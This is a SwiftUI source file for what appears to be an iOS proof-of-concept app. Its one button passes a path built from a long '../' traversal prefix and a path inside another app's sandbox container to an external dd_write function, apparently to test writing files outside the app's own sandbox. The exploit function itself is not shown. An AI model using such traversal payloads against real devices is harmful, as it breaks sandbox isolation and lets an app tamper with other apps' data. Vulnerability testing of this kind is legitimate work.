import SwiftUI

struct ContentView: View {
    private let targetPath = "/var/mobile/Containers/Data/Application/6A65489C-F668-4C29-AFA2-4B1FE2C4C645/Documents/hellobommer_test"
    private let traversalPrefix = "../../../../../../../../../../.."

    @State private var running = false
    @State private var showAlert = false
    @State private var alertTitle = ""
    @State private var alertMessage = ""

    var body: some View {
        VStack(spacing: 24) {
            Button("Write") { runWrite() }
                .buttonStyle(.borderedProminent)
                .disabled(running)

            if running {
                ProgressView()
            }
        }
        .padding()
        .alert(alertTitle, isPresented: $showAlert) {
            Button("OK") {}
        } message: {
            Text(alertMessage)
        }
    }

    private func runWrite() {
        running = true
        let destination = targetPath
        let identifier = traversalPrefix + destination

        Task.detached {
            let result = dd_write(identifier, destination)
            await finish(
                title: result == 0 ? "Write OK" : "Write Failed",
                message: result == 0
                    ? "Created:\n\(destination)"
                    : "dd_write returned \(result)\n\(destination)"
            )
        }
    }

    @MainActor
    private func finish(title: String, message: String) {
        running = false
        alertTitle = title
        alertMessage = message
        showAlert = true
    }
}
